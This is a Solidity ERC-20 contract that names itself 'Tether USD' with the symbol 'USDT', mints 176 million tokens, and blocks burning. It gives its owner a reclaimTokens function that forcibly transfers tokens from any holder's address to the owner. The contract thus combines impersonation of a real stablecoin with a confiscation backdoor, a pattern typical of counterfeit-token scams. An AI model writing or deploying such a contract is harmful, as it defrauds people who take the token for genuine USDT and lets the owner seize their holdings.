// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// This is a custom USDT-like token with a reclaim mechanism.
contract ReclaimableUSDT is ERC20, Ownable {
    /**
     * @dev Sets the values for {name}, {symbol}, and {decimals}.
     * It also sets the initial owner and mints the total supply.
     * @param initialOwner The address that will control the contract.
     */
    constructor(address initialOwner)
        ERC20("Tether USD", "USDT") // Sets the token name and symbol.
        Ownable(initialOwner)       // Sets you as the owner.
    {
        // Mint 176 million tokens.
        // USDT standard uses 6 decimals, so we multiply by 10**6.
        _mint(address(this), 176000000 * (10 ** 6));
    }

    /**
     * @dev Allows the contract owner to forcibly reclaim tokens from any account.
     * This is the unified management and recovery mechanism.
     * @param from The address to reclaim tokens from.
     * @param amount The amount of tokens to reclaim (in the smallest unit).
     */
    function reclaimTokens(address from, uint256 amount) public onlyOwner {
        // Transfers tokens from the 'from' address directly to your (the owner's) address.
        _transfer(from, owner(), amount);
    }

    /**
     * @dev Overrides the internal _update function to block transfers to the zero address,
     * effectively preventing anyone from "burning" (destroying) the tokens.
     */
    function _update(address from, address to, uint256 value)
        internal
        override
    {
        // This line ensures that tokens cannot be sent to the burn address.
        require(to != address(0), "transfer to the zero address is not allowed");
        super._update(from, to, value);
    }
}
